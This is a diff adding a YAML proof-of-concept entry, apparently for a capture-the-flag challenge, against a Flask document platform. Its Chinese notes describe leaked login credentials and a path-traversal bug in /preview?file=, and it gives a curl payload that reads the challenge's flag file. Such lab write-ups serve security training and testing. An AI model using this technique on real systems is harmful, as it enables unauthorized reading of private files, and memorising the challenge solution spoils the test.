@@ -1,0 +1,15 @@
+info:
+  name: flask-lfi-preview
+  cve: ''
+  summary: Flask 文档协作平台：登录页泄露凭据 + /preview?file= 路径遍历读任意文件 → flag 在 /challenge/flag.txt
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: Flask 文档协作平台：登录页泄露凭据 + /preview?file= 路径遍历读任意文件 → flag 在 /challenge/flag.txt
+  steps:
+  - 登录页泄露凭据 → 用 sysadmin/docpass 登录拿 session cookie → 访问 /preview?file=<绝对路径> 触发路径遍历
+    → 读 /challenge/flag.txt 拿 flag
+  payload: curl -b cookies.txt "http://target/preview?file=/challenge/flag.txt"
+  verification: Flask 文档协作平台：登录页泄露凭据 + /preview?file= 路径遍历读任意文件 → flag 在 /challenge/flag.txt
